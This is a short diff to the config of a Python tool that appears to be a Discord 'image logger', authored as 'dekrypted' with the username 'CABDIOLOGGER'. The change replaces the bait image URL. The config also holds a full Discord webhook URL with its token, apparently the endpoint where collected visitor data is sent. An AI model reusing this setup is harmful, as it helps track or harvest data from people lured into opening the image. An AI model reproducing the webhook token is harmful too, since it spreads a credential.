@@ -11,7 +11,7 @@ __author__ = "dekrypted"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1449139151428390983/StkSp2cRwQ_NvZ04x4bps1b7PrY6N9HrSusutEEdT408PTxQP7teJlBVWVbDm3khl7v4",
-    "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg", 
+    "image": "https://i.pinimg.com/736x/36/c8/39/36c839615879b4bfd7102abde3757040.jpg", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
